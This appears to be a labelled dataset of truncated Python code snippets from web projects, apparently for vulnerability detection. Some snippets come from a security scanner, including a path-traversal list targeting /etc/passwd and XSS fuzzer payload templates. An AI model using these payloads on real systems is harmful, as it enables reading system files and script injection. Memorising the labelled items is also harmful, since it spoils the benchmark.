jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(id=job['id']) doc=doc2", "label": 0}, {"snippet_id": 8111, "code": "[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 46202, "code": "':{ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) } }) else: return render('search.mako', request,{ 'collection': collection, 'query", "label": 0}, {"snippet_id": 998, "code": " xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query", "label": 0}, {"snippet_id": 46416, "code": "'uuid'], type='search-dashboard', owner=request.user, description=collection['label']) Document.objects.link(dashboard_doc, owner=request.user, name=collection['name'], description=collection['label'],", "label": 0}, {"snippet_id": 24699, "code": "() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store", "label": 0}, {"snippet_id": 903, "code": "', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url", "label": 0}, {"snippet_id": 1945, "code": "(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({\"scanid\": scanid},{\"$set\":", "label": 0}, {"snippet_id": 13629, "code": "'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 32778, "code": "<td class=\"u-lineNum u-noSelect FileContents-lineNum\">' '<a name=\"%(num)s\" ' 'onclick=\"window.location.hash=%(quot)s '%(num)s</a></td>' '<td class=\"FileContents-lineContents\">%(line)s</td></tr>') %{'num'", "label": 0}, {"snippet_id": 17655, "code": ".views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views", "label": 0}, {"snippet_id": 22334, "code": " name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if", "label": 0}, {"snippet_id": 41648, "code": " cache=True) \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module", "label": 0}, {"snippet_id": 13751, "code": ">[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/", "label": 1}, {"snippet_id": 45347, "code": " coordinator_dict=json.loads(request.POST.get('coordinator', '{}')) coordinator=Coordinator(data=coordinator_dict) response['status']=0 response['xml']=coordinator.to_xml() return HttpResponse(json.dumps", "label": 0}, {"snippet_id": 49346, "code": "=self.field_name pass if self.order_field: self.order=SmartOrder(query_params=query_params, column_id=column_id, ordering_query_param=ordering_query_param) class SmartFilterValue(QueryParamsMixin, object):", "label": 0}, {"snippet_id": 43541, "code": "(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required.", "label": 0}, {"snippet_id": 18370, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter", "label": 0}, {"snippet_id": 31874, "code": " \"+path]) \t\terror=funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir='fullpath') \t\tif error: \t\t\tprint('<div class=\"alert alert-danger\">Upload fail: %s</div>' % error)\t\t\t \t\telse: ", "label": 0}, {"snippet_id": 50218, "code": " client_disconnect(self, csessid): \"\"\" Disconnect session with given csessid. Args: csessid(int): Session id. \"\"\" if csessid in self.requests: self.requests[csessid].finish() del self.requests[csessid]", "label": 0}, {"snippet_id": 41677, "code": "(_class, BaseDocument): \t\t\t\t\t_class=getattr(module, classname) \t\t\t\telse: \t\t\t\t\traise ImportError(doctype) \t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class", "label": 0}, {"snippet_id": 52566, "code": " %(node['widgetType'].split('-')[0], node['id'][:4]) return HttpResponse(json.dumps(response), mimetype=\"application/json\") def action_parameters(request): response={'status': -1} parameters=set() try:", "label": 0}, {"snippet_id": 50458, "code": ".notifyFinish().addErrback(self._responseFailed, csessid, request) if csessid in self.requests: self.requests[csessid].finish() self.requests[csessid]=request return server.NOT_DONE_YET def mode_close(self", "label": 0}, {"snippet_id": 55174, "code": "=action_status['latest_translation_pk'] ).update_latest_translation() update_translation_memory( action_status['changed_translation_pks'], project, locale ) return JsonResponse({ 'count': action_status['count']", "label": 0}, {"snippet_id": 38606, "code": "\tself.dont_update_if_missing=[] \t\tif hasattr(self, \"__setup__\"): \t\t\tself.__setup__() \t@property \tdef meta(self): \t\tif not hasattr(self, \"_meta\"): \t\t\tself._meta=frappe.get_meta(self.doctype) \t\treturn self", "label": 0}, {"snippet_id": 31730, "code": ") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read '+form.getvalue('color')+' list</div>') \t\t if form.getvalue('bwlists_create'): \tlist_name=form.getvalue('bwlists_create", "label": 0}, {"snippet_id": 9410, "code": "'staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r", "label": 0}, {"snippet_id": 8333, "code": ")$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 30770, "code": ">Edit something else</a></h3><br />' %(enable, backend, serv, serv)) \t\t\t \tfunct.ssh_command(serv, command, show_log=\"1\") \taction='edit.py ' +enable +' ' +backend \tfunct.logging(serv, action) if act==\"showCompareConfigs", "label": 0}, {"snippet_id": 48885, "code": ".items(): if value is None: del query[key] return '?{}'.format(urlencode(query)) class SmartListField(object): def __init__(self, smart_list_item, column, object): self.smart_list_item=smart_list_item self", "label": 0}, {"snippet_id": 49443, "code": "=field self.model_field=self.model._meta.get_field(self.field_name) self.query_params=query_params self.object_list=object_list def get_title(self): if isinstance(self.model_field, SmartListFilter): return", "label": 0}, {"snippet_id": 37132, "code": " \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation", "label": 0}, {"snippet_id": 11922, "code": "=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns", "label": 0}, {"snippet_id": 3316, "code": "(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1", "label": 0}, {"snippet_id": 46634, "code": ".get_context_data() data['life_conditions']=LifeCondition.objects.with_benefits() return data class BenefitClaimView(FormView): template_name='core/benefit_claim.html' form_class=EntryForm def get(self,", "label": 0}, {"snippet_id": 10574, "code": " from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite", "label": 0}, {"snippet_id": 49208, "code": ") return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) def get_reverse_sort_by(self): new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", ", "label": 0}, {"snippet_id": 19238, "code": "=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_class_spec(self): spec='test_foo.py:FooTest' suite=BokChoyTestSuite(''", "label": 0}, {"snippet_id": 20273, "code": " multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property def cmd(self): \"", "label": 0}, {"snippet_id": 28680, "code": "=%s\">' % ref) \telse: \t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \t\t\t\t def is_admin(**kwargs): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ", "label": 0}, {"snippet_id": 14029, "code": "'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 50543, "code": " such as initializing or sending/receving data through the request. It uses a long-polling mechanism to avoid sending data unless there is actual data available. Args: request(Request): Incoming request. ", "label": 0}, {"snippet_id": 39300, "code": " not self.name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str", "label": 0}, {"snippet_id": 21624, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups", "label": 0}, {"snippet_id": 24129, "code": " mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected command", "label": 0}, {"snippet_id": 40196, "code": "\t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission", "label": 0}, {"snippet_id": 42680, "code": ".fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg(df", "label": 0}, {"snippet_id": 45153, "code": " coordinator=Coordinator() api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) workflows=[dict([('uuid', d.content_object.uuid),('name'", "label": 0}, {"snippet_id": 30952, "code": ",extensions=['jinja2.ext.loopcontrols']) \ttemplate=env.get_template('config_show.html') \t \ttemplate=template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'),", "label": 1}, {"snippet_id": 741, "code": ".api_request(xss_url,\"GET\",headers) print xss_request.text if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[", "label": 1}, {"snippet_id": 49946, "code": " -this url is called by the ajax chat using POST requests(long-polling when necessary) The WebClient resource in this module will handle these requests and act as a gateway to sessions connected over the", "label": 0}, {"snippet_id": 15341, "code": ".get('default_store', None) self.verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ", "label": 1}, {"snippet_id": 9848, "code": "?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$", "label": 0}, {"snippet_id": 46868, "code": " markdown(content) async def clear_mc(self): for key in(MC_KEY_N_COMMENTS, MC_KEY_COMMENT_LIST): await clear_mc(key % self.post_id) @property async def user(self): return await GithubUser.get(gid=self.github_id", "label": 0}, {"snippet_id": 30731, "code": " servers state\" | sudo socat stdio %s > %s' %(haproxy_sock, server_state_file) \t\tcommand=[ cmd, save_command] \telse: \t\tcommand=[ cmd] \t\t \tif enable !=\"show\": \t\tprint('<center><h3>You %s %s on HAproxy %s", "label": 0}, {"snippet_id": 40389, "code": "\tset_encrypted_password(self.doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): ", "label": 0}, {"snippet_id": 31721, "code": "=open(list, \"r\") \t\tfile_read=file.read() \t\tfile.close \t\tprint(file_read) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read '+form.getvalue('color')+' list</div>') \t", "label": 0}, {"snippet_id": 9567, "code": "/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 15818, "code": "-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir:", "label": 0}, {"snippet_id": 29357, "code": " +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path') +\" && sudo \" +sql.get_setting('restart_command')]\t \t\tif sql.get_setting('firewall_enable')==\"1\": \t\t\tcommands.extend(open_port_firewalld", "label": 0}, {"snippet_id": 41194, "code": "\t \t\ttitle=_('Blog') \t) \tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed", "label": 1}, {"snippet_id": 25443, "code": ") kwargs['required']=False kwargs['widget']=(kwargs.get('widget') or self.widget)( scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs',{}) ) defaults.update(**kwargs) for fname, label, size in", "label": 0}, {"snippet_id": 28353, "code": "=ExtendedInterpolation()) \t\tconfig.read(path_config) \texcept: \t\tprint('Content-type: text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file, whether it exists and the path. Must be:", "label": 0}, {"snippet_id": 1875, "code": ": print url, headers,method,body temp_body={} post_vul_param='' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload", "label": 0}, {"snippet_id": 22808, "code": "(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id", "label": 1}, {"snippet_id": 10722, "code": " vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite, self).__init__(*args, **kwargs", "label": 0}, {"snippet_id": 5497, "code": "'onwheel' ] _htmlTemplate=''' <!DOCTYPE html> <html> <head> <title>XSS Fuzzer</title> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> </head> <body> %s </body> </html> ''' _probes=[ \"\"\"'", "label": 0}, {"snippet_id": 1413, "code": "'Description': vul['Description'], 'remediation': vul['remediation'] } vul_list.append(all_data) break except: pass print vul_list return vul_list @app.route('/alerts/<scanid>', methods=['GET']) def return_alerts", "label": 0}, {"snippet_id": 34756, "code": "],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t", "label": 0}, {"snippet_id": 36817, "code": " \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context.category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\",", "label": 0}, {"snippet_id": 47746, "code": "=' +str(reason)) def action_save_user(request: HttpRequest, default_forward_url: str=\"/admin/users\"): \"\"\" This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse", "label": 0}, {"snippet_id": 27028, "code": " check for: \" +furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for lfi in lfi_attacks: post_params={} counter+=1 parameters=\"\" for i in range(0,len", "label": 0}, {"snippet_id": 44496, "code": ".update_data({'workflow': workflow.get_data()['workflow']}) doc2.save() workflow.set_workspace(request.user) workflow.check_workspace(request.fs, request.user) response={} request.info(_('Workflows copied", "label": 0}, {"snippet_id": 22972, "code": "]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 19121, "code": " TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for", "label": 1}, {"snippet_id": 12714, "code": "'ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views", "label": 0}, {"snippet_id": 12936, "code": "'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/',", "label": 0}, {"snippet_id": 32012, "code": ".search_s(ldap_base, ldap.SCOPE_SUBTREE, criteria, attributes) \t\tresults=[entry for dn, entry in result if isinstance(entry, dict)] \t\ttry: \t\t\tprint('[\"'+results[0][ldap_search_field][0].decode(\"utf-8\")+'\",\"", "label": 0}, {"snippet_id": 13633, "code": ", name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware", "label": 0}, {"snippet_id": 47184, "code": " invenio_records.admin import record_adminview from invenio_records.api import Record def test_admin(app, db): \"\"\"Test flask-admin interace.\"\"\" admin=Admin(app, name=\"Test\") assert 'model' in record_adminview assert ", "label": 0}, {"snippet_id": 48474, "code": " forward_url=\"/admin?success\" if u.rights > 0: forward_url=\"/admin/reservations\" if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if \"payload\" not in request.GET: return HttpResponseRedirect(\"", "label": 0}, {"snippet_id": 3841, "code": " dbupdate.update_record({\"scanid\": scanid},{\"$set\":{\"scan_data\": post_vul_param+\" are vulnerable to XSS\"}}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update", "label": 0}, {"snippet_id": 11952, "code": "'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki", "label": 0}, {"snippet_id": 28585, "code": " telebot \tfrom telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs.get('ip')) \tproxy=sql.get_setting('proxy') \t \tfor telegram in telegrams: \t\ttoken_bot=telegram[1] \t\tchannel_name", "label": 0}, {"snippet_id": 4488, "code": " in xrange(256): yield chr(i) @staticmethod def fuzzUnicode(cnt=1): for i in xrange(cnt): yield unichr(random.randint(0, 0xffff)) @staticmethod def fuzzUnicodeReplace(s, cnt=1): s=s.replace(\"A\", \"\u0100\", cnt", "label": 0}, {"snippet_id": 14722, "code": " test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec", "label": 0}, {"snippet_id": 42807, "code": "\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname", "label": 0}, {"snippet_id": 6145, "code": " self.section=_CONFIG_SECTION _CONFIG_DEFAULTS['debug']=str(debug) cfgdir=os.path.dirname(filename) _CONFIG_DEFAULTS['pysaml2_config']=os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config']) self.config", "label": 0}, {"snippet_id": 2954, "code": "(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers", "label": 0}, {"snippet_id": 17591, "code": ", 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user", "label": 0}, {"snippet_id": 9754, "code": " url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER", "label": 0}, {"snippet_id": 43249, "code": "}'({3}) will get truncated, as max characters allowed is{2}\")\\ \t\t\t\t\t\t.format(reference, _(df.label), max_length, value), frappe.CharacterLengthExceededError, title=_('Value too big')) \tdef _validate_update_after_submit", "label": 0}, {"snippet_id": 51540, "code": "'django_otp.middleware.OTPMiddleware', ] ROOT_URLCONF='dashboard.urls' TEMPLATES=[ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS':[ BASE_DIR +'/', ], 'APP_DIRS': True, 'OPTIONS'", "label": 0}, {"snippet_id": 7284, "code": " 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release", "label": 0}, {"snippet_id": 42504, "code": "\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert() \t\t\treturn \t\td=self.get_valid_dict(convert_dates_to_str=True)", "label": 0}, {"snippet_id": 15357, "code": "('VERIFY_XSS', False)) self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None", "label": 1}, {"snippet_id": 11228, "code": "'{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd", "label": 0}, {"snippet_id": 51323, "code": "'internet_nl_api_password' in form.changed_data: f=Fernet(settings.FIELD_ENCRYPTION_KEY) encrypted=f.encrypt(obj.internet_nl_api_password.encode()) obj.internet_nl_api_password=encrypted super().save_model(request, obj, form", "label": 0}, {"snippet_id": 36088, "code": "(pwd))=='*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t", "label": 0}, {"snippet_id": 22007, "code": ", 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$", "label": 0}, {"snippet_id": 54217, "code": " blue').grid(row=5) Label(main, text=\"HTTP Proxy:\",background='light sky blue').grid(row=6) Label(main, text=\"Refresh:\",background='light sky blue').grid(row=7) Label(main, text=\"Crawl\",background='light", "label": 0}, {"snippet_id": 24744, "code": "-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir)) print msg if self.imports_dir: sh( \"DEFAULT_STORE={default_store", "label": 0}, {"snippet_id": 26475, "code": "./../../etc/passwd', '../../../../../../../../etc/passwd', '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e", "label": 0}, {"snippet_id": 41871, "code": "\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value", "label": 0}, {"snippet_id": 9656, "code": "/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine", "label": 0}, {"snippet_id": 3826, "code": " dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param: dbupdate.update_record({", "label": 0}, {"snippet_id": 14250, "code": ".MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete'", "label": 0}, {"snippet_id": 22851, "code": "[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter", "label": 1}, {"snippet_id": 4394, "code": "<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>' % payload def div(self, payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%", "label": 0}, {"snippet_id": 12994, "code": " urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view", "label": 0}, {"snippet_id": 28982, "code": ".log\", \"a\") \t\tlog.write(diff) \t\tlog.close \texcept IOError: \t\tprint('<center><div class=\"alert alert-danger\">Can\\'t read write change to log. %s</div></center>' % stderr) \t\tpass \t\t def install_haproxy(serv", "label": 0}, {"snippet_id": 29701, "code": ".get_setting('haproxy_sock_port') \tcmd='echo \"show backend\" |nc %s %s' %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tret=\"\" \tfor line in output: \t\tif \" \t\t\tcontinue \t\tif line !=\"\": \t\t\tback", "label": 0}, {"snippet_id": 40981, "code": "\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140]", "label": 0}, {"snippet_id": 28947, "code": "\tlog_path=get_config_var('main', 'log_path') \tdiff=\"\" \tdate=get_data('date_in_log') \tcmd=\"/bin/diff -ub %s %s\" %(oldcfg, cfg) \t \toutput, stderr=subprocess_execute(cmd) \t \tfor line in output: \t\tdiff +=date +\"", "label": 0}, {"snippet_id": 31458, "code": "\"curr_ssl_con\", source=source, alpha=0.5, color=\" \t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha=0.5, color=\" \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp", "label": 0}, {"snippet_id": 41284, "code": " Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1", "label": 0}, {"snippet_id": 43547, "code": " precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield:", "label": 0}, {"snippet_id": 19669, "code": " test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir", "label": 0}, {"snippet_id": 24459, "code": ".verbosity=kwargs.get('verbosity', DEFAULT_VERBOSITY) self.num_processes=kwargs.get('num_processes', DEFAULT_NUM_PROCESSES) self.verify_xss=kwargs.get('verify_xss', os.environ.get('VERIFY_XSS', False)) self", "label": 1}, {"snippet_id": 3447, "code": "\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1", "label": 0}, {"snippet_id": 2388, "code": " 